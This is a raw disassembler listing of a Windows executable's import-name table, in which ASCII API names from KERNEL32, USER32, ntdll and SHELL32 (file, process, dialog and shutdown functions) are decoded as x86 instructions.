 100a08e:	6f                   	outsl  %ds:(%esi),(%dx)
 100a08f:	64 75 6c             	fs jne 0x100a0fe
 100a092:	65 46                	gs inc %esi
 100a094:	69 6c 65 4e 61 6d 65 	imul   $0x41656d61,0x4e(%ebp,%eiz,2),%ebp
 100a09b:	41 
 100a09c:	00 00                	add    %al,(%eax)
 100a09e:	ce                   	into
 100a09f:	00 46 69             	add    %al,0x69(%esi)
 100a0a2:	6e                   	outsb  %ds:(%esi),(%dx)
 100a0a3:	64 43                	fs inc %ebx
 100a0a5:	6c                   	insb   (%dx),%es:(%edi)
 100a0a6:	6f                   	outsl  %ds:(%esi),(%dx)
 100a0a7:	73 65                	jae    0x100a10e
 100a0a9:	00 dc                	add    %bl,%ah
 100a0ab:	00 46 69             	add    %al,0x69(%esi)
 100a0ae:	6e                   	outsb  %ds:(%esi),(%dx)
 100a0af:	64 4e                	fs dec %esi
 100a0b1:	65 78 74             	gs js  0x100a128
 100a0b4:	46                   	inc    %esi
 100a0b5:	69 6c 65 41 00 d2 00 	imul   $0x4600d200,0x41(%ebp,%eiz,2),%ebp
 100a0bc:	46 
 100a0bd:	69 6e 64 46 69 72 73 	imul   $0x73726946,0x64(%esi),%ebp
 100a0c4:	74 46                	je     0x100a10c
 100a0c6:	69 6c 65 41 00 00 43 	imul   $0x430000,0x41(%ebp,%eiz,2),%ebp
 100a0cd:	00 
 100a0ce:	43                   	inc    %ebx
 100a0cf:	6f                   	outsl  %ds:(%esi),(%dx)
 100a0d0:	70 79                	jo     0x100a14b
 100a0d2:	46                   	inc    %esi
 100a0d3:	69 6c 65 41 00 19 03 	imul   $0x53031900,0x41(%ebp,%eiz,2),%ebp
 100a0da:	53 
 100a0db:	65 74 46             	gs je  0x100a124
 100a0de:	69 6c 65 41 74 74 72 	imul   $0x69727474,0x41(%ebp,%eiz,2),%ebp
 100a0e5:	69 
 100a0e6:	62 75 74             	bound  %esi,0x74(%ebp)
 100a0e9:	65 73 41             	gs jae 0x100a12d
 100a0ec:	00 00                	add    %al,(%eax)
 100a0ee:	5c                   	pop    %esp
 100a0ef:	03 53 79             	add    0x79(%ebx),%edx
 100a0f2:	73 74                	jae    0x100a168
 100a0f4:	65 6d                	gs insl (%dx),%es:(%edi)
 100a0f6:	54                   	push   %esp
 100a0f7:	69 6d 65 54 6f 46 69 	imul   $0x69466f54,0x65(%ebp),%ebp
 100a0fe:	6c                   	insb   (%dx),%es:(%edi)
 100a0ff:	65 54                	gs push %esp
 100a101:	69 6d 65 00 00 c8 01 	imul   $0x1c80000,0x65(%ebp),%ebp
 100a108:	47                   	inc    %edi
 100a109:	65 74 53             	gs je  0x100a15f
 100a10c:	79 73                	jns    0x100a181
 100a10e:	74 65                	je     0x100a175
 100a110:	6d                   	insl   (%dx),%es:(%edi)
 100a111:	54                   	push   %esp
 100a112:	69 6d 65 00 4d 01 47 	imul   $0x47014d00,0x65(%ebp),%ebp
 100a119:	65 74 44             	gs je  0x100a160
 100a11c:	69 73 6b 46 72 65 65 	imul   $0x65657246,0x6b(%ebx),%esi
 100a123:	53                   	push   %ebx
 100a124:	70 61                	jo     0x100a187
 100a126:	63 65 41             	arpl   %esp,0x41(%ebp)
 100a129:	00 9f 02 51 75 65    	add    %bl,0x65755102(%edi)
 100a12f:	72 79                	jb     0x100a1aa
 100a131:	44                   	inc    %esp
 100a132:	6f                   	outsl  %ds:(%esi),(%dx)
 100a133:	73 44                	jae    0x100a179
 100a135:	65 76 69             	gs jbe 0x100a1a1
 100a138:	63 65 41             	arpl   %esp,0x41(%ebp)
 100a13b:	00 40 01             	add    %al,0x1(%eax)
 100a13e:	47                   	inc    %edi
 100a13f:	65 74 43             	gs je  0x100a185
 100a142:	75 72                	jne    0x100a1b6
 100a144:	72 65                	jb     0x100a1ab
 100a146:	6e                   	outsb  %ds:(%esi),(%dx)
 100a147:	74 44                	je     0x100a18d
 100a149:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
 100a150:	79 41                	jns    0x100a193
 100a152:	00 00                	add    %al,(%eax)
 100a154:	10 03                	adc    %al,(%ebx)
 100a156:	53                   	push   %ebx
 100a157:	65 74 45             	gs je  0x100a19f
 100a15a:	6e                   	outsb  %ds:(%esi),(%dx)
 100a15b:	64 4f                	fs dec %edi
 100a15d:	66 46                	inc    %si
 100a15f:	69 6c 65 00 00 20 03 	imul   $0x53032000,0x0(%ebp,%eiz,2),%ebp
 100a166:	53 
 100a167:	65 74 46             	gs je  0x100a1b0
 100a16a:	69 6c 65 54 69 6d 65 	imul   $0x656d69,0x54(%ebp,%eiz,2),%ebp
 100a171:	00 
 100a172:	5a                   	pop    %edx
 100a173:	02 4c 6f 63          	add    0x63(%edi,%ebp,2),%cl
 100a177:	61                   	popa
 100a178:	6c                   	insb   (%dx),%es:(%edi)
 100a179:	46                   	inc    %esi
 100a17a:	69 6c 65 54 69 6d 65 	imul   $0x54656d69,0x54(%ebp,%eiz,2),%ebp
 100a181:	54 
 100a182:	6f                   	outsl  %ds:(%esi),(%dx)
 100a183:	46                   	inc    %esi
 100a184:	69 6c 65 54 69 6d 65 	imul   $0x656d69,0x54(%ebp,%eiz,2),%ebp
 100a18b:	00 
 100a18c:	8f 00                	pop    (%eax)
 100a18e:	44                   	inc    %esp
 100a18f:	6f                   	outsl  %ds:(%esi),(%dx)
 100a190:	73 44                	jae    0x100a1d6
 100a192:	61                   	popa
 100a193:	74 65                	je     0x100a1fa
 100a195:	54                   	push   %esp
 100a196:	69 6d 65 54 6f 46 69 	imul   $0x69466f54,0x65(%ebp),%ebp
 100a19d:	6c                   	insb   (%dx),%es:(%edi)
 100a19e:	65 54                	gs push %esp
 100a1a0:	69 6d 65 00 5a 01 47 	imul   $0x47015a00,0x65(%ebp),%ebp
 100a1a7:	65 74 45             	gs je  0x100a1ef
 100a1aa:	78 69                	js     0x100a215
 100a1ac:	74 43                	je     0x100a1f1
 100a1ae:	6f                   	outsl  %ds:(%esi),(%dx)
 100a1af:	64 65 50             	fs gs push %eax
 100a1b2:	72 6f                	jb     0x100a223
 100a1b4:	63 65 73             	arpl   %esp,0x73(%ebp)
 100a1b7:	73 00                	jae    0x100a1b9
 100a1b9:	00 66 00             	add    %ah,0x0(%esi)
 100a1bc:	43                   	inc    %ebx
 100a1bd:	72 65                	jb     0x100a224
 100a1bf:	61                   	popa
 100a1c0:	74 65                	je     0x100a227
 100a1c2:	50                   	push   %eax
 100a1c3:	72 6f                	jb     0x100a234
 100a1c5:	63 65 73             	arpl   %esp,0x73(%ebp)
 100a1c8:	73 41                	jae    0x100a20b
 100a1ca:	00 00                	add    %al,(%eax)
 100a1cc:	bc 00 45 78 70       	mov    $0x70784500,%esp
 100a1d1:	61                   	popa
 100a1d2:	6e                   	outsb  %ds:(%esi),(%dx)
 100a1d3:	64 45                	fs inc %ebp
 100a1d5:	6e                   	outsb  %ds:(%esi),(%dx)
 100a1d6:	76 69                	jbe    0x100a241
 100a1d8:	72 6f                	jb     0x100a249
 100a1da:	6e                   	outsb  %ds:(%esi),(%dx)
 100a1db:	6d                   	insl   (%dx),%es:(%edi)
 100a1dc:	65 6e                	outsb  %gs:(%esi),(%dx)
 100a1de:	74 53                	je     0x100a233
 100a1e0:	74 72                	je     0x100a254
 100a1e2:	69 6e 67 73 41 00 63 	imul   $0x63004173,0x67(%esi),%ebp
 100a1e9:	01 47 65             	add    %eax,0x65(%edi)
 100a1ec:	74 46                	je     0x100a234
 100a1ee:	69 6c 65 53 69 7a 65 	imul   $0x657a69,0x53(%ebp,%eiz,2),%ebp
 100a1f5:	00 
 100a1f6:	6f                   	outsl  %ds:(%esi),(%dx)
 100a1f7:	00 43 72             	add    %al,0x72(%ebx)
 100a1fa:	65 61                	gs popa
 100a1fc:	74 65                	je     0x100a263
 100a1fe:	54                   	push   %esp
 100a1ff:	68 72 65 61 64       	push   $0x64616572
 100a204:	00 00                	add    %al,(%eax)
 100a206:	4f                   	dec    %edi
 100a207:	00 43 72             	add    %al,0x72(%ebx)
 100a20a:	65 61                	gs popa
 100a20c:	74 65                	je     0x100a273
 100a20e:	45                   	inc    %ebp
 100a20f:	76 65                	jbe    0x100a276
 100a211:	6e                   	outsb  %ds:(%esi),(%dx)
 100a212:	74 41                	je     0x100a255
 100a214:	00 00                	add    %al,(%eax)
 100a216:	a3 01 47 65 74       	mov    %eax,0x74654701
 100a21b:	50                   	push   %eax
 100a21c:	72 6f                	jb     0x100a28d
 100a21e:	63 65 73             	arpl   %esp,0x73(%ebp)
 100a221:	73 48                	jae    0x100a26b
 100a223:	65 61                	gs popa
 100a225:	70 00                	jo     0x100a227
 100a227:	00 24 02             	add    %ah,(%edx,%eax,1)
 100a22a:	49                   	dec    %ecx
 100a22b:	6e                   	outsb  %ds:(%esi),(%dx)
 100a22c:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
 100a233:	65 
 100a234:	43                   	inc    %ebx
 100a235:	72 69                	jb     0x100a2a0
 100a237:	74 69                	je     0x100a2a2
 100a239:	63 61 6c             	arpl   %esp,0x6c(%ecx)
 100a23c:	53                   	push   %ebx
 100a23d:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
 100a242:	6e                   	outsb  %ds:(%esi),(%dx)
 100a243:	41                   	inc    %ecx
 100a244:	6e                   	outsb  %ds:(%esi),(%dx)
 100a245:	64 53                	fs push %ebx
 100a247:	70 69                	jo     0x100a2b2
 100a249:	6e                   	outsb  %ds:(%esi),(%dx)
 100a24a:	43                   	inc    %ebx
 100a24b:	6f                   	outsl  %ds:(%esi),(%dx)
 100a24c:	75 6e                	jne    0x100a2bc
 100a24e:	74 00                	je     0x100a250
 100a250:	a3 02 51 75 65       	mov    %eax,0x65755102
 100a255:	72 79                	jb     0x100a2d0
 100a257:	50                   	push   %eax
 100a258:	65 72 66             	gs jb  0x100a2c1
 100a25b:	6f                   	outsl  %ds:(%esi),(%dx)
 100a25c:	72 6d                	jb     0x100a2cb
 100a25e:	61                   	popa
 100a25f:	6e                   	outsb  %ds:(%esi),(%dx)
 100a260:	63 65 43             	arpl   %esp,0x43(%ebp)
 100a263:	6f                   	outsl  %ds:(%esi),(%dx)
 100a264:	75 6e                	jne    0x100a2d4
 100a266:	74 65                	je     0x100a2cd
 100a268:	72 00                	jb     0x100a26a
 100a26a:	46                   	inc    %esi
 100a26b:	01 47 65             	add    %eax,0x65(%edi)
 100a26e:	74 43                	je     0x100a2b3
 100a270:	75 72                	jne    0x100a2e4
 100a272:	72 65                	jb     0x100a2d9
 100a274:	6e                   	outsb  %ds:(%esi),(%dx)
 100a275:	74 54                	je     0x100a2cb
 100a277:	68 72 65 61 64       	push   $0x64616572
 100a27c:	49                   	dec    %ecx
 100a27d:	64 00 00             	add    %al,%fs:(%eax)
 100a280:	43                   	inc    %ebx
 100a281:	01 47 65             	add    %eax,0x65(%edi)
 100a284:	74 43                	je     0x100a2c9
 100a286:	75 72                	jne    0x100a2fa
 100a288:	72 65                	jb     0x100a2ef
 100a28a:	6e                   	outsb  %ds:(%esi),(%dx)
 100a28b:	74 50                	je     0x100a2dd
 100a28d:	72 6f                	jb     0x100a2fe
 100a28f:	63 65 73             	arpl   %esp,0x73(%ebp)
 100a292:	73 49                	jae    0x100a2dd
 100a294:	64 00 ca             	fs add %cl,%dl
 100a297:	01 47 65             	add    %eax,0x65(%edi)
 100a29a:	74 53                	je     0x100a2ef
 100a29c:	79 73                	jns    0x100a311
 100a29e:	74 65                	je     0x100a305
 100a2a0:	6d                   	insl   (%dx),%es:(%edi)
 100a2a1:	54                   	push   %esp
 100a2a2:	69 6d 65 41 73 46 69 	imul   $0x69467341,0x65(%ebp),%ebp
 100a2a9:	6c                   	insb   (%dx),%es:(%edi)
 100a2aa:	65 54                	gs push %esp
 100a2ac:	69 6d 65 00 6f 03 55 	imul   $0x55036f00,0x65(%ebp),%ebp
 100a2b3:	6e                   	outsb  %ds:(%esi),(%dx)
 100a2b4:	68 61 6e 64 6c       	push   $0x6c646e61
 100a2b9:	65 64 45             	gs fs inc %ebp
 100a2bc:	78 63                	js     0x100a321
 100a2be:	65 70 74             	gs jo  0x100a335
 100a2c1:	69 6f 6e 46 69 6c 74 	imul   $0x746c6946,0x6e(%edi),%ebp
 100a2c8:	65 72 00             	gs jb  0x100a2cb
 100a2cb:	00 4b 03             	add    %cl,0x3(%ebx)
 100a2ce:	53                   	push   %ebx
 100a2cf:	65 74 55             	gs je  0x100a327
 100a2d2:	6e                   	outsb  %ds:(%esi),(%dx)
 100a2d3:	68 61 6e 64 6c       	push   $0x6c646e61
 100a2d8:	65 64 45             	gs fs inc %ebp
 100a2db:	78 63                	js     0x100a340
 100a2dd:	65 70 74             	gs jo  0x100a354
 100a2e0:	69 6f 6e 46 69 6c 74 	imul   $0x746c6946,0x6e(%edi),%ebp
 100a2e7:	65 72 00             	gs jb  0x100a2ea
 100a2ea:	4b                   	dec    %ebx
 100a2eb:	45                   	inc    %ebp
 100a2ec:	52                   	push   %edx
 100a2ed:	4e                   	dec    %esi
 100a2ee:	45                   	inc    %ebp
 100a2ef:	4c                   	dec    %esp
 100a2f0:	33 32                	xor    (%edx),%esi
 100a2f2:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
 100a2f5:	6c                   	insb   (%dx),%es:(%edi)
 100a2f6:	00 00                	add    %al,(%eax)
 100a2f8:	cb                   	lret
 100a2f9:	01 4c 6f 61          	add    %ecx,0x61(%edi,%ebp,2)
 100a2fd:	64 53                	fs push %ebx
 100a2ff:	74 72                	je     0x100a373
 100a301:	69 6e 67 41 00 c6 00 	imul   $0xc60041,0x67(%esi),%ebp
 100a308:	45                   	inc    %ebp
 100a309:	6e                   	outsb  %ds:(%esi),(%dx)
 100a30a:	64 44                	fs inc %esp
 100a30c:	69 61 6c 6f 67 00 66 	imul   $0x6600676f,0x6c(%ecx),%esp
 100a313:	02 53 65             	add    0x65(%ebx),%dl
 100a316:	74 50                	je     0x100a368
 100a318:	61                   	popa
 100a319:	72 65                	jb     0x100a380
 100a31b:	6e                   	outsb  %ds:(%esi),(%dx)
 100a31c:	74 00                	je     0x100a31e
 100a31e:	df 01                	filds  (%ecx)
 100a320:	4d                   	dec    %ebp
 100a321:	65 73 73             	gs jae 0x100a397
 100a324:	61                   	popa
 100a325:	67 65 42             	addr16 gs inc %edx
 100a328:	6f                   	outsl  %ds:(%esi),(%dx)
 100a329:	78 41                	js     0x100a36c
 100a32b:	00 9e 00 44 69 61    	add    %bl,0x61694400(%esi)
 100a331:	6c                   	insb   (%dx),%es:(%edi)
 100a332:	6f                   	outsl  %ds:(%esi),(%dx)
 100a333:	67 42                	addr16 inc %edx
 100a335:	6f                   	outsl  %ds:(%esi),(%dx)
 100a336:	78 50                	js     0x100a388
 100a338:	61                   	popa
 100a339:	72 61                	jb     0x100a39c
 100a33b:	6d                   	insl   (%dx),%es:(%edi)
 100a33c:	41                   	inc    %ecx
 100a33d:	00 3b                	add    %bh,(%ebx)
 100a33f:	02 53 65             	add    0x65(%ebx),%dl
 100a342:	6e                   	outsb  %ds:(%esi),(%dx)
 100a343:	64 4d                	fs dec %ebp
 100a345:	65 73 73             	gs jae 0x100a3bb
 100a348:	61                   	popa
 100a349:	67 65 41             	addr16 gs inc %ecx
 100a34c:	00 00                	add    %al,(%eax)
 100a34e:	36 02 53 65          	add    %ss:0x65(%ebx),%dl
 100a352:	6e                   	outsb  %ds:(%esi),(%dx)
 100a353:	64 44                	fs inc %esp
 100a355:	6c                   	insb   (%dx),%es:(%edi)
 100a356:	67 49                	addr16 dec %ecx
 100a358:	74 65                	je     0x100a3bf
 100a35a:	6d                   	insl   (%dx),%es:(%edi)
 100a35b:	4d                   	dec    %ebp
 100a35c:	65 73 73             	gs jae 0x100a3d2
 100a35f:	61                   	popa
 100a360:	67 65 41             	addr16 gs inc %ecx
 100a363:	00 92 02 53 68 6f    	add    %dl,0x6f685302(%edx)
 100a369:	77 57                	ja     0x100a3c2
 100a36b:	69 6e 64 6f 77 00 00 	imul   $0x776f,0x64(%esi),%ebp
 100a372:	55                   	push   %ebp
 100a373:	53                   	push   %ebx
 100a374:	45                   	inc    %ebp
 100a375:	52                   	push   %edx
 100a376:	33 32                	xor    (%edx),%esi
 100a378:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
 100a37b:	6c                   	insb   (%dx),%es:(%edi)
 100a37c:	00 00                	add    %al,(%eax)
 100a37e:	90                   	nop
 100a37f:	00 4e 74             	add    %cl,0x74(%esi)
 100a382:	43                   	inc    %ebx
 100a383:	6c                   	insb   (%dx),%es:(%edi)
 100a384:	6f                   	outsl  %ds:(%esi),(%dx)
 100a385:	73 65                	jae    0x100a3ec
 100a387:	00 81 00 4e 74 41    	add    %al,0x41744e00(%ecx)
 100a38d:	64 6a 75             	fs push $0x75
 100a390:	73 74                	jae    0x100a406
 100a392:	50                   	push   %eax
 100a393:	72 69                	jb     0x100a3fe
 100a395:	76 69                	jbe    0x100a400
 100a397:	6c                   	insb   (%dx),%es:(%edi)
 100a398:	65 67 65 73 54       	gs addr16 gs jae 0x100a3f1
 100a39d:	6f                   	outsl  %ds:(%esi),(%dx)
 100a39e:	6b 65 6e 00          	imul   $0x0,0x6e(%ebp),%esp
 100a3a2:	fb                   	sti
 100a3a3:	00 4e 74             	add    %cl,0x74(%esi)
 100a3a6:	4f                   	dec    %edi
 100a3a7:	70 65                	jo     0x100a40e
 100a3a9:	6e                   	outsb  %ds:(%esi),(%dx)
 100a3aa:	50                   	push   %eax
 100a3ab:	72 6f                	jb     0x100a41c
 100a3ad:	63 65 73             	arpl   %esp,0x73(%ebp)
 100a3b0:	73 54                	jae    0x100a406
 100a3b2:	6f                   	outsl  %ds:(%esi),(%dx)
 100a3b3:	6b 65 6e 00          	imul   $0x0,0x6e(%ebp),%esp
 100a3b7:	00 7e 01             	add    %bh,0x1(%esi)
 100a3ba:	4e                   	dec    %esi
 100a3bb:	74 53                	je     0x100a410
 100a3bd:	68 75 74 64 6f       	push   $0x6f647475
 100a3c2:	77 6e                	ja     0x100a432
 100a3c4:	53                   	push   %ebx
 100a3c5:	79 73                	jns    0x100a43a
 100a3c7:	74 65                	je     0x100a42e
 100a3c9:	6d                   	insl   (%dx),%es:(%edi)
 100a3ca:	00 00                	add    %al,(%eax)
 100a3cc:	6e                   	outsb  %ds:(%esi),(%dx)
 100a3cd:	74 64                	je     0x100a433
 100a3cf:	6c                   	insb   (%dx),%es:(%edi)
 100a3d0:	6c                   	insb   (%dx),%es:(%edi)
 100a3d1:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
 100a3d4:	6c                   	insb   (%dx),%es:(%edi)
 100a3d5:	00 43 4f             	add    %al,0x4f(%ebx)
 100a3d8:	4d                   	dec    %ebp
 100a3d9:	43                   	inc    %ebx
 100a3da:	54                   	push   %esp
 100a3db:	4c                   	dec    %esp
 100a3dc:	33 32                	xor    (%edx),%esi
 100a3de:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
 100a3e1:	6c                   	insb   (%dx),%es:(%edi)
 100a3e2:	00 00                	add    %al,(%eax)
 100a3e4:	bc 00 53 48 47       	mov    $0x47485300,%esp
 100a3e9:	65 74 50             	gs je  0x100a43c
 100a3ec:	61                   	popa
 100a3ed:	74 68                	je     0x100a457
 100a3ef:	46                   	inc    %esi
 100a3f0:	72 6f                	jb     0x100a461
 100a3f2:	6d                   	insl   (%dx),%es:(%edi)
 100a3f3:	49                   	dec    %ecx
 100a3f4:	44                   	inc    %esp
 100a3f5:	4c                   	dec    %esp
 100a3f6:	69 73 74 41 00 00 79 	imul   $0x79000041,0x74(%ebx),%esi
 100a3fd:	00 53 48             	add    %dl,0x48(%ebx)
 100a400:	42                   	inc    %edx
 100a401:	72 6f                	jb     0x100a472
 100a403:	77 73                	ja     0x100a478
 100a405:	65 46                	gs inc %esi
 100a407:	6f                   	outsl  %ds:(%esi),(%dx)
 100a408:	72 46                	jb     0x100a450
 100a40a:	6f                   	outsl  %ds:(%esi),(%dx)
 100a40b:	6c                   	insb   (%dx),%es:(%edi)
 100a40c:	64 65 72 41          	fs gs jb 0x100a451
 100a410:	00 00                	add    %al,(%eax)
 100a412:	53                   	push   %ebx
 100a413:	48                   	dec    %eax
 100a414:	45                   	inc    %ebp
 100a415:	4c                   	dec    %esp
 100a416:	4c                   	dec    %esp
 100a417:	33 32                	xor    (%edx),%esi
 100a419:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
 100a41c:	6c                   	insb   (%dx),%es:(%edi)
	...
